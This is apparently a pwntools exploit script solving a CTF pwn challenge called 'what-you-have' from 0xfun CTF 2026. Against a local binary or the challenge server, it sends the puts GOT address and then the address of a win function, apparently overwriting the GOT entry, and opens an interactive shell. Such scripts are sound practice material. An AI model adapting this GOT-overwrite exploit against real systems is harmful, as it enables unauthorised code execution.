#!/usr/bin/env python3
from pwn import *

TARGET_PATH = os.path.realpath(
    "/ctf-writeups/2026/0xfun-ctf/pwn/what-you-have/dist/chall"
)

elf = context.binary = ELF(TARGET_PATH)

context.update(log_level="debug", terminal=["tmux", "split-window", "-h"])


def get_stream():
    if "remote" in sys.argv:
        return remote("chall.0xfun.org", 28320)

    return process(TARGET_PATH)


def attach_gdb(r):
    if "debug" in sys.argv:
        bkps = []
        cmds = []

        gdbscript = ["break {}".format(x) for x in bkps] + cmds
        gdb.attach(r, "\n".join(gdbscript))


def exploit(r):
    r.sendlineafter(b"!\n", f"{elf.got.puts}".encode())
    r.sendlineafter(b"!\n", f"{elf.sym.win}".encode())
    r.interactive()


def main():
    r = get_stream()
    attach_gdb(r)
    exploit(r)


if __name__ == "__main__":
    main()
